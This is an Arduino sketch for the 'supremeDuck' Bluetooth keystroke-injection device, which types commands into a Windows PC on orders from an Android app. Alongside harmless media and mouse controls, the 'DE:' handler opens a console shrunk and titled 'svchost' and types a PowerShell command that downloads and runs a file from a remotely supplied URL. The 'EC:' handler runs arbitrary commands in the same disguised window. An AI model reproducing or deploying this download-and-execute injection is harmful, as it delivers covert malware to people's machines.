/*
supremeDuck project - https://www.youtube.com/user/MichalMonday
Created by Michal Borowski
*/

/*
Communication characteristics:
Android App -> Arduino (currently the communication is one sided - maybe some length checks could be added to prevent data loss in the air but it's not needed now I think)  
*/

#include <SoftwareSerial.h>
#include "Keyboard.h"
#include "Mouse.h"
#include <EEPROM.h> 

#define LOG_SAVED_ENCODING_EEPROM false
#define LOG_SERIAL false //setting to true makes mouse movement laggy if the serial monitor isn't open

#define HC_BAUDRATE 9600 //(default baud rate of hc-06)

/*
#define EEPROM_ADDRESS_TRIGGER_TRICK 0
trick = plug it in + plug out within 3 secs = special function is triggered(that special function is commented out in "setup" funciton)
*/

//add comma check in app or solve the bug (if data received by arduino ends with ",,end" instead of standard ",end" arduino won't respond)


//https://www.arduino.cc/en/Reference/KeyboardModifiers

//SoftwareSerial BTSerial(16, 15);
SoftwareSerial BTSerial(9, 8); // RX | TX these are pins responsible for communication between the bluetooth module and arduino
//SoftwareSerial BTSerial(8, 9); //old pinout (less comfortable to solder, now only 1 of these devices has it this way)

#define MAX_SERIAL_LENGTH 200 //if you'd like to make it greater than 255 make sure to replace "byte" with "int" inside every "for loop"
char inSerial[MAX_SERIAL_LENGTH]; //it will contain the text sent from bluetooth module and received in arduino

#define ENCODING_BYTE_DESIRED 0
#define ENCODING_BYTE_USED 1
#define ENCODING_BYTE_MODIFIER 2
byte Encoding[3][100] = { //definition only applies to new devices where encoding isn't saved at EEPROM yet. By default it's US keyboard encoding
  {0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F, 0x40, 0x41, 0x4D, 0x51, 0x57, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F, 0x60, 0x61, 0x69, 0x6D, 0x71, 0x77, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E},
  {0x31, 0x22, 0x33, 0x34, 0x35, 0x37, 0x22, 0x39, 0x30, 0x38, 0x3D, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3B, 0x3B, 0x2C, 0x3D, 0x2E, 0x2F, 0x32, 0x61, 0x6D, 0x71, 0x77, 0x79, 0x7A, 0x5B, 0x5C, 0x5D, 0x36, 0x2D, 0x7E, 0x61, 0x69, 0x6D, 0x71, 0x77, 0x79, 0x7A, 0x5B, 0x5C, 0x5D, 0x7E},
  {0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x00, 0x81, 0x81, 0x81, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x81, 0x00, 0x81, 0x00, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x81, 0x00, 0x00, 0x00, 0x81, 0x81, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x81, 0x81, 0x81, 0x81}
}; //saved at EEPROM 1-100, 101-200, 201-300


#define EEPROM_STARTING_ADDRESS_ENCODING_DESIRED 1
#define EEPROM_STARTING_ADDRESS_ENCODING_USED 101
#define EEPROM_STARTING_ADDRESS_ENCODING_MODIFIER 201


/*
 * keypad values copied from http://forum.arduino.cc/index.php?topic=266688.msg1880647#msg1880647
 * thanks to nickgammon's reply
 */

byte KEYPAD[10] = {
  234,
  225,
  226,
  227,
  228,
  229,
  230,
  231,
  232,
  233
};

#define KEYPAD_0 234
#define KEYPAD_1 225
#define KEYPAD_2 226
#define KEYPAD_3 227
#define KEYPAD_4 228
#define KEYPAD_5 229
#define KEYPAD_6 230
#define KEYPAD_7 231
#define KEYPAD_8 232
#define KEYPAD_9 233 

bool useMultiLangWindowsMethod = true;
#define EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS 301

void setup()
{
  BTSerial.begin(HC_BAUDRATE);  //
  Keyboard.begin();
  Mouse.begin();

  Serial.begin(9600);


  /*
  //TRIGGER TRICK
  //plug in and out within 3 sec to trigger some action at the next plug in
  byte triggerDefault = 0;
  EEPROM.get(EEPROM_ADDRESS_TRIGGER_TRICK, triggerDefault);
  byte c =1;
  EEPROM.put(EEPROM_ADDRESS_TRIGGER_TRICK, c);
  if(triggerDefault == 1)
  {
    //action
  }

  delay(3000);
  c =0;
  EEPROM.put(EEPROM_ADDRESS_TRIGGER_TRICK, c);  
  */  

  /*
  delay(7000);
 
  for(byte i=0;i<255;i++)
  {
    Keyboard.print(i);
    Keyboard.print("-");
    Keyboard.print((char)i);
    Keyboard.print(", ");
    
    delay(100);
  }
  */
  
  //delay(7000);
  //Keyboard.press((char)175);
  //delay(15);
  //Keyboard.releaseAll();

  /*
  Keyboard.press(KEY_LEFT_ALT);
  delay(20);
  Keyboard.press(KEYPAD_9);
  delay(20);
  Keyboard.release(KEYPAD_9);
  delay(20);
  Keyboard.press(KEYPAD_2);
  delay(20);
  Keyboard.release(KEYPAD_2);
  delay(20);
  Keyboard.releaseAll();
  */
  
  //delay(10000);  
  SavedEncodingAvailabilityCheck(); //rewrites the default US encoding with the saved one
  SavedMultiLangMethodWindowsCheck(); //checks whether to use the alt+numpad method
}


void loop()
{ 
  byte i=0; 
  if (BTSerial.available() > 0) 
  {        
    unsigned long previousByteRec = millis();
    unsigned long lastByteRec = millis();
    while (100 > lastByteRec - previousByteRec)
    {      
      lastByteRec = millis();
    
      while (BTSerial.available() > 0 && i < MAX_SERIAL_LENGTH-1) 
      {
        inSerial[i]=BTSerial.read(); 
        i++;         
  
        if(i == 16)
        {
          if(StrStartsWith(inSerial, "MM:") && StrEndsWith(inSerial, ",end")){if(LOG_SERIAL){Serial.println(inSerial);} inSerial[i]='\0'; MyFuncMouseMove(inSerial);i = 0;}//MM:L,U,3,1,end (mouse movement)
        }
        previousByteRec = lastByteRec;
      }    
    }

    inSerial[i]='\0';
    if(LOG_SERIAL){Serial.write(inSerial);} //it's useful for checking what text arduino receives from android but it makes the mouse movement laggy if the serial monitor is closed
    Serial.write("\n");
    
    Check_Protocol(inSerial);        
  }
} 

void SavedMultiLangMethodWindowsCheck()
{
  EEPROM.get(EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS, useMultiLangWindowsMethod);
  if(LOG_SERIAL)
  { 
    Serial.print("MultiLang method (Windows only) setting has been read from the EEPROM - ");
    if(useMultiLangWindowsMethod)
    {
      Serial.println("it's enabled.");
    }
    else
    {
      Serial.println("it's disabled.");
    }
  }
}

void SavedEncodingAvailabilityCheck() //rewrites the default US encoding with the one which was used last time
{
  byte b;
  EEPROM.get(EEPROM_STARTING_ADDRESS_ENCODING_DESIRED, b);
  if(b > 0)
  {
    for(byte i=0;i<3; i++)
    {
      for(byte offset=0; offset<100; offset++)
      {
        EEPROM.get(offset+1+(100*i), Encoding[i][offset]); //+1 because the 0 address holds trigger bool for tricky activation method
        if(LOG_SAVED_ENCODING_EEPROM)
        {
          Serial.print(Encoding[i][offset], HEX);
          Serial.print(",");
        }
      }

      if(LOG_SAVED_ENCODING_EEPROM){Serial.print("\n");}
    }
  }
  else if(LOG_SAVED_ENCODING_EEPROM)
  {
    Serial.print("No encoding available");
    Serial.print("\n");
  }
}

void MyFuncMouseMove(char *inStr)
{
  char x;
  char y;

  //MM:L,U,FF,FF,end
  char strValBuff[3]={inStr[7],inStr[8],'\0'}; 
  x = (char)strtoul((char*)strtok(strValBuff, " "),NULL,16);
   
  strValBuff[0]=inStr[10]; 
  strValBuff[1]=inStr[11]; 
  y = (char)strtoul((char*)strtok(strValBuff, " "),NULL,16);
  
 //MM:L,U,FF,FF,end //left/right, up/down, horizontal value, vertical value
  if(inStr[3] == 'L'){x = x * -1;}
  if(inStr[5] == 'D'){y = y * -1;}       

  if(LOG_SERIAL){Serial.print("    x="); Serial.print((byte)x);Serial.print(", y=");Serial.print((byte)y);Serial.print("\n");}
  Mouse.move(x, y, 0);
  
  for(byte i=0;i<strlen(inStr);i++){inStr[i]=0;}
}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void openRun()
{
  Keyboard.press(KEY_LEFT_GUI);
  delay(200);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();
  delay(700);
}

void openCmd()
{
  openRun();  
  Print("cmd");
  typeKey(KEY_RETURN); 
}

void EnterCommand(char *text)
{
  Print(text);
  delay(10);
  typeKey(KEY_RETURN);  
}

void Check_Protocol(char *inStr)
{       
  if(!strcmp(inStr,"Enter"))
  {    
    typeKey(KEY_RETURN);
  }

  if(!strcmp(inStr,"Alt+F4"))
  {    
    Keyboard.press(KEY_LEFT_ALT);
    delay(10);
    Keyboard.press(KEY_F4);
    delay(50);
    Keyboard.releaseAll();
  }

  if(!strcmp(inStr,"Increase font size"))
  {    
    Keyboard.press(KEY_LEFT_CTRL);
    delay(10);
    Keyboard.press(KEY_LEFT_SHIFT);
    delay(10);
    Keyboard.press('>');
    delay(50);
    Keyboard.releaseAll();  
  }

  if(!strcmp(inStr,"Decrease font size"))
  {    
    Keyboard.press(KEY_LEFT_CTRL);
    delay(10);
    Keyboard.press(KEY_LEFT_SHIFT);
    delay(10);
    Keyboard.press('<');
    delay(50);
    Keyboard.releaseAll();  
  }

  if(!strcmp(inStr,"Select all"))
  {    
    Keyboard.press(KEY_LEFT_CTRL);
    delay(10);
    Keyboard.press('a');
    delay(50);
    Keyboard.releaseAll();  
  }

  if(!strcmp(inStr,"Bold"))
  {    
    Keyboard.press(KEY_LEFT_CTRL);
    delay(10);
    Keyboard.press('b');
    delay(50);
    Keyboard.releaseAll();  
  }

  if(!strcmp(inStr,"Underline"))
  {    
    Keyboard.press(KEY_LEFT_CTRL);
    delay(10);
    Keyboard.press('u');
    delay(50);
    Keyboard.releaseAll();  
  }

  if(!strcmp(inStr,"click"))
  {    
    Mouse.click();
  }

  if(StrStartsWith(inStr, "DE:") && StrContains(inStr, ",type:") && StrEndsWith(inStr, ",end")) //DE:t,type:est,end (download and execute)
  {
    byte indexType = SubStrIndex(inStr, ",type:"); //trying to get the position where link is ending and the file type begins
    byte indexEnd = SubStrIndex(inStr, ",end"); //trying to get the position where the file type ends (to know its length)

    char fileFormat[10];
    byte typeLen = indexEnd - (indexType + strlen(",type:")); //get length
    for(byte i=0;i<=typeLen;i++)
    {
      fileFormat[i] = inStr[i+indexType+strlen(",type:")];
      
      if(i == typeLen){fileFormat[i] = '\0';}
    }
       
    for(byte i=0;i<=indexType-3;i++)//indexType - 3 which is "DE:" + 1
    {
      inStr[i] = inStr[i+3];
      
      if(i == indexType-3){inStr[i] = '\0';}
    }    
      
    openCmd(); //("powershell Start-Process cmd -Verb runAs");
    delay(500);
    EnterCommand("echo off & mode 20,1 & title svchost & color 78 & cls");
    
    Print("powershell \"$down = New-Object System.Net.WebClient; $url = '");
    Print(inStr);
    Print("'; $file = 'downloadedfile.");
    Print(fileFormat);
    Print("'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;\" & exit");
    typeKey(KEY_RETURN);
  }
  

  if(StrStartsWith(inStr, "YT:") && StrEndsWith(inStr, ",end")) //YT:t,end (Youtube)
  {
    ExtractDeliveredText(inStr, 3);
    
    openRun();
    //Print("www.youtube.com/embed/2Z4m4lnjxkY?rel=0&autoplay=1"); //trololo 2Z4m4lnjxkY  
    Print("www.youtube.com/embed/");
    Print(inStr);
    Print("?rel=0&autoplay=1");
    typeKey(KEY_RETURN);     
  }

  if(StrStartsWith(inStr, "YTB:") && StrEndsWith(inStr, ",end"))//youtube control buttons
  {
    ExtractDeliveredText(inStr, 4);
    if(StrContains(inStr, "PP")){Print(" ");}//pause/play
    else if(StrContains(inStr, "F5")){Keyboard.press(KEY_RIGHT_ARROW);}//forward 5s // change inc/vol to 10 sec if it doesn't work and use Print("l/j")
    else if(StrContains(inStr, "B5")){Keyboard.press(KEY_LEFT_ARROW);}//backward 5s
    else if(StrContains(inStr, "GB")){Keyboard.press(KEY_HOME);}//go to begining
    else if(StrContains(inStr, "GE")){Keyboard.press(KEY_END);}//go to end
    else if(StrContains(inStr, "CA")){Print("c");}//captions tog
    else if(StrContains(inStr, "IS")){Keyboard.press(KEY_LEFT_SHIFT); delay(50); Print(">");}//increase speed (may not work in all browsers)
    else if(StrContains(inStr, "DS")){Keyboard.press(KEY_LEFT_SHIFT); delay(50); Print("<");}//decrease speed
    else if(StrContains(inStr, "IV")){Keyboard.press(KEY_UP_ARROW);}//increase vol
    else if(StrContains(inStr, "DV")){Keyboard.press(KEY_DOWN_ARROW);}//decrease vol
    else if(StrContains(inStr, "PV")){Keyboard.press(KEY_LEFT_SHIFT); delay(50); Print("p");}//previous video (in a playlist)
    else if(StrContains(inStr, "NV")){Keyboard.press(KEY_LEFT_SHIFT); delay(50); Print("n");}//next video
    else if(StrContains(inStr, "FS")){Print("f");}//full screen tog
    else if(StrContains(inStr, "F11")){Keyboard.press(KEY_F11);}//full screen browser tog
    delay (70);
    Keyboard.releaseAll();
  }

  if(StrStartsWith(inStr, "WS:") && StrEndsWith(inStr, ",end")) //WS:t,end (website)
  {
    ExtractDeliveredText(inStr, 3);
    
    openRun();
    Print(inStr);
    typeKey(KEY_RETURN);     
  }

  if(StrStartsWith(inStr, "EP:") && StrEndsWith(inStr, ",end")) //EP:t,end (execute program)
  {
    ExtractDeliveredText(inStr, 3);
    
    openRun();
    Print(inStr);
    delay(100);
    typeKey(KEY_RETURN);  
  }

  if(StrStartsWith(inStr, "EC:") && StrEndsWith(inStr, ",end")) //EC:t,end (execute command)
  {
    ExtractDeliveredText(inStr, 3);
    
    openCmd();
    delay(500);
    EnterCommand("echo off & mode 20,1 & title svchost & color 78 & cls");
    Print(inStr);
    if(StrStartsWith(inStr, "cd \"%USERPROFILE%\\Desktop\" & FOR")){typeKey(KEY_RETURN); delay(50); Print("echo a");} //exception for a command which creates multiple files (otherwise only one file would be created, echo a is added because command " & exit" wouldn't close the window without something preceding it

    Print(" & exit");
    typeKey(KEY_RETURN);  
    delay(100);
  }

  //.

 
  
  if(StrStartsWith(inStr ,"PT:") && StrEndsWith(inStr, ",end")) //(direct text instruction)
  {
    ExtractDeliveredText(inStr, 3);
    Print(inStr);
  }

  if(StrStartsWith(inStr ,"TE:") && StrEndsWith(inStr, ",end")) //(direct text instruction but with enter at the end )
  {
    ExtractDeliveredText(inStr, 3);
    Print(inStr);
    delay(20);
    Keyboard.press(KEY_RETURN);
    delay(20);
    Keyboard.release(KEY_RETURN);
  }

  if(StrStartsWith(inStr, "ENC,") && StrEndsWith(inStr, ",end")) //(direct text instruction)
  {
    byte encodingFactor=255;
    switch (inStr[4]) //5th letter is D, U or M depending on the type of 3 encoding factors
    {
      case 'D':
        {
          encodingFactor=0;
        }     
        break;
        
      case 'U':
        {
          encodingFactor=1;  
        }
        break;
      case 'M':
        {
          encodingFactor=2; 
        }
        break;
      default:
        {
          Serial.print("Error: Incorrect encoding factor.");
          return;
        }
        break;
    }   

    ExtractDeliveredText(inStr, 6);
    
    if(LOG_SAVED_ENCODING_EEPROM){Serial.print("Received:\n");}

    for(byte offset=0; offset<strlen(inStr); offset+=2)
    {
      byte strValBuff[3]={inStr[offset],inStr[offset+1],'\0'}; 

      Encoding[encodingFactor][offset/2] = (byte)strtoul((char*)strtok(strValBuff, " "),NULL,16);//(((byte)inStr[offset]) * 16) + (byte)inStr[offset+1];         

      if(LOG_SAVED_ENCODING_EEPROM)
      {
        Serial.print(Encoding[encodingFactor][offset/2], HEX);
        Serial.print("-");
        Serial.print(offset);
        Serial.print("  ");       
      }
    }  
    
    if(LOG_SAVED_ENCODING_EEPROM){Serial.print("\nSaved to EEPROM:\n");}

    //save to EEPROM
    for(byte offset=0; offset<100; offset++)
    {
      Encoding[encodingFactor][offset] = ((offset<(strlen(inStr)/2)) ? Encoding[encodingFactor][offset] : 0);
      EEPROM.put(offset+1+(100*encodingFactor), Encoding[encodingFactor][offset]); //+1 because the 0 address holds trigger bool for tricky activation method
      
      if(LOG_SAVED_ENCODING_EEPROM)
      {
        Serial.print(Encoding[encodingFactor][offset], HEX);
        Serial.print(",");
      }
    }

    if(LOG_SAVED_ENCODING_EEPROM){Serial.print("\n\n");}
    
  } 

  if(StrStartsWith(inStr, "SW:") && StrContains(inStr, ",type:") && StrEndsWith(inStr, ",end")) //SW:t,type:est,end (download and set as a wallpaper)
  {
    byte indexType = SubStrIndex(inStr, ",type:"); //trying to get the position where link is ending and the file type begins
    byte indexEnd = SubStrIndex(inStr, ",end"); //trying to get the position where the file type ends (to know its length)

    char fileFormat[10];
    byte typeLen = indexEnd - (indexType + strlen(",type:")); //get length
    for(byte i=0;i<=typeLen;i++)
    {
      fileFormat[i] = inStr[i+indexType+strlen(",type:")];
      
      if(i == typeLen){fileFormat[i] = '\0';}
    }
       
    for(byte i=0;i<=indexType-3;i++)//indexType - 3 which is "SW:" + 1
    {
      inStr[i] = inStr[i+3];
      
      if(i == indexType-3){inStr[i] = '\0';}
    }    
      
    openCmd(); //("powershell Start-Process cmd -Verb runAs");
    delay(500);
    EnterCommand("echo off & mode 20,1 & title svchost & color 78 & cls");
    
    Print("powershell \"$down = New-Object System.Net.WebClient; $url = '");
    Print(inStr);
    Print("'; $file = 'downloadedfile.");
    Print(fileFormat);
    Print("'; $down.DownloadFile($url,$file); exit;\" & reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d C:\\Users\\%USERNAME%\\downloadedfile.");
    Print(fileFormat);
    Print(" /f & RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters & exit");
    typeKey(KEY_RETURN);
  }

  if(StrStartsWith(inStr ,"ML:") && StrEndsWith(inStr, ",end")) //(direct text instruction)
  {
    ExtractDeliveredText(inStr, 3);
    
    if(!strcmp(inStr,"Enabled"))
    {
      useMultiLangWindowsMethod = true;
      EEPROM.put(EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS, true);
      if(LOG_SERIAL){Serial.println("MultiLang method (Windows only) has been enabled.");}
    }
    else if(!strcmp(inStr,"Disabled")) 
    {
      useMultiLangWindowsMethod = false;
      EEPROM.put(EEPROM_ADDRESS_USE_MULTI_LANG_METHOD_WINDOWS, false);
      if(LOG_SERIAL){Serial.println("MultiLang method (Windows only) has been disabled.");}
    }
  }
  
  for(byte i=0;i<MAX_SERIAL_LENGTH;i++){inStr[i]=0;}
}

/*
ENC,D:2122232425262728292A2B2C2D2E2F303132333435363738393A3B3C3D3E3F40414D5157595A5B5C5D5E5F6061696D7177797A7B7C7D7E,end
ENC,U:317E333435373238392D345C3D2F37303132333435363738392F5C2C302E2D71616D7177797A382D39333D5C61226D7177797A375C305D,end
ENC,M:81008686818181818100810000008100000000000000000000818181818181868181818181818686868181860000000000000086818686,end
*/

void ExtractDeliveredText(char *inStr, byte ignoredStartingChars) //gets rid of the first 3 chars (e.g. "YT:") and the ",end" (it assumes that every message received ends with ",end", if the message would end like ",ending" the function won't work properly without adding additional parameter, somthing like: "byte ignoredEndingChars")
{
  byte len = SubStrIndex(inStr, ",end") - ignoredStartingChars;      
   
  for(byte i=0;i<=len;i++)
  {
    inStr[i] = inStr[i+ignoredStartingChars];
    if(i == len)
    {
      inStr[i] = '\0';
    }
  }
}

int SubStrIndex(char *str, char *sfind)
{
    byte found = 0;
    byte index = 0;
    byte len = strlen(str);
   
    if (strlen(sfind) > len) 
    {
        return 0;
    }
    
    while (index < len) 
    {                
        if (str[index] == sfind[found]) 
        {
            found++;
            if (strlen(sfind) == found) 
            {
                index = index - strlen(sfind) + 1;               
                return index;
            }
        }
        else{found = 0;}   
           
        index++;
    }

    return 0;
}

bool StrContains(char *str, char *sfind)
{
    byte found = 0;
    byte index = 0;
    byte len;

    len = strlen(str);
    
    if (strlen(sfind) > len) {return false;}
    
    while (index < len) 
    {
        if (str[index] == sfind[found]) 
        {
            found++;
            if (strlen(sfind) == found) {return true;}
        }
        else {found = 0;}
        
        index++;
    }

    return false;
}

bool StrStartsWith(char* str, char* desiredStart)
{
  if(strlen(desiredStart)>strlen(str)){return false;}
  
  byte matching = 0;
  for(byte i=0; i < strlen(desiredStart); i++)  
    if(str[i] == desiredStart[i])    
      matching++;
      
  if(matching == strlen(desiredStart))  
    return true;
  
  return false;
}

bool StrEndsWith(char* str, char* desiredEnd)
{
  if(strlen(desiredEnd)>strlen(str))
  {
    return false;
  }
  byte matching = 0;
  byte desiredEndLen = strlen(desiredEnd);
  byte baseStrLen = strlen(str);
  for(byte i=0;i<strlen(desiredEnd);i++)
  {
    if(str[baseStrLen - desiredEndLen + i] == desiredEnd[i]){matching++;}
  }
  
  if(matching == desiredEndLen){return true;}
  
  return false;
}



void Print(char *inStr)
{

  //Print_WinMultiLangCHAR_PTR(inStr);
  //return;
   
  int enc_index;
  
  for(byte i=0; i<strlen(inStr); i++)//for each character in the string
  {  
    if (useMultiLangWindowsMethod && ((!isalnum(inStr[i]) && inStr[i] != ' ') || IsException(inStr[i]))) //if character is punctuation or requires different button to be pressed in different keyboard language settings then use alt+numpad method
    //if(IsCharSpecial(inStr[i]))
    {
      //Serial.print("special char = ");
      //Serial.println(inStr[i]);
      
      byte hundreds = (byte)inStr[i] / 100;
      byte dozens = ((byte)inStr[i] - (hundreds*100)) / 10;
      byte singles = (byte)inStr[i] - (hundreds*100) - (dozens*10);

      //Serial.print(hundreds);
      //Serial.print(dozens);
      //Serial.println(singles);
  
      Keyboard.press(KEY_LEFT_ALT);
      PressRelease((char)KEYPAD[hundreds], 5);
      PressRelease((char)KEYPAD[dozens], 5);
      PressRelease((char)KEYPAD[singles], 5);
      Keyboard.releaseAll();
      continue;
    }
  
    
    enc_index = GetKeyIndex(inStr[i], Encoding[ENCODING_BYTE_DESIRED]);
    if(enc_index < 256) //256 means it's a key not present in the array (key which does not need a substitution because it is the same for any keyboard setting)
    {    
      if(Encoding[ENCODING_BYTE_MODIFIER][enc_index] > 0)
      {
        Keyboard.press(Encoding[ENCODING_BYTE_MODIFIER][enc_index]);
        delay(5);
      }

      Keyboard.press(Encoding[ENCODING_BYTE_USED][enc_index]);
      delay(5);     

      //Serial.print(inStr[i]);
      //Serial.print(", ");
      //Serial.print(Desired_Keys[enc_index]);
      //Serial.print(", ");
      //Serial.print(Modifier_Keys[enc_index]);
      //Serial.print(", ");
      //Serial.print(Used_Keys[enc_index]);
      //Serial.print(", ");
      //Serial.print("\n");
      
    }
    else
    {
      Keyboard.press(inStr[i]);
      //Serial.print(", ");
      //Serial.println(inStr[i]);
      delay(5);
      
    }

    Keyboard.releaseAll();
  }
}

int GetKeyIndex(byte c, byte* char_array)
{
  for(byte i=0;i<strlen(char_array);i++)
  {
    if(c == char_array[i])
    {
      return i;
    }
  }
  return 256;
}


/*
void Print_WinMultiLangCHAR_PTR(char *inStr)
{
  for(byte i=0; i<strlen(inStr); i++)//for each character in the string
  {
    byte hundreds = (byte)inStr[i] / 100;
    byte dozens = ((byte)inStr[i] - (hundreds*100)) / 10;
    byte singles = (byte)inStr[i] - (hundreds*100) - (dozens*10);

    Keyboard.press(KEY_LEFT_ALT);
    PressRelease((char)KEYPAD[hundreds], 5);
    PressRelease((char)KEYPAD[dozens], 5);
    PressRelease((char)KEYPAD[singles], 5);
    Keyboard.releaseAll();
  }
}

void Print_WinMultiLangSTR(String inStr)
{
  for(byte i=0; i<inStr.length(); i++)//for each character in the string
  {
    byte hundreds = (byte)inStr.charAt(i) / 100;
    byte dozens = ((byte)inStr.charAt(i) - (hundreds*100)) / 10;
    byte singles = (byte)inStr.charAt(i) - (hundreds*100) - (dozens*10);

    Keyboard.press(KEY_LEFT_ALT);
    PressRelease((char)KEYPAD[hundreds], 5);
    PressRelease((char)KEYPAD[dozens], 5);
    PressRelease((char)KEYPAD[singles], 5);
    Keyboard.releaseAll();
  }
}

*/

void PressRelease(char c, byte timeDelay)
{
  Keyboard.press(c);
  delay(timeDelay);
  Keyboard.release(c);
}


/*
Exceptions are the letters that require different button being pressed in different lang settings 
(so if letter == exception then use alt+numpad method, otherwise use the normal typing because it's faster to press 1 instead of 4 buttons) 
these exceptions are listed to make the typing process faster because using alt+numpad method for all the characters appears to be too slow

german - yz
french - qamwz
dutch - qamwz
turkish - i
azerbaijani - totally uncompatible
*/

#define EXCEPTIONS_SIZE 7
char exceptions[EXCEPTIONS_SIZE] = {
  'y',
  'z',
  'q',
  'a',
  'm',
  'w',
  'i',
};

/*
bool IsCharSpecial(char c)
{
  byte b = (byte)c;
  if((b == 32 || (b >= 49 && b <= 57) || (b >= 65 && b <= 90) || (b >= 97 && b <= 122)) && IsntException(b))
  {
    return false;
  }
  return true;
}
*/

bool IsException(char c)
{
  for(byte i=0; i<EXCEPTIONS_SIZE; i++)
  {
    if(c == exceptions[i])
    {
      return true;
    }
  }
  return false;
}










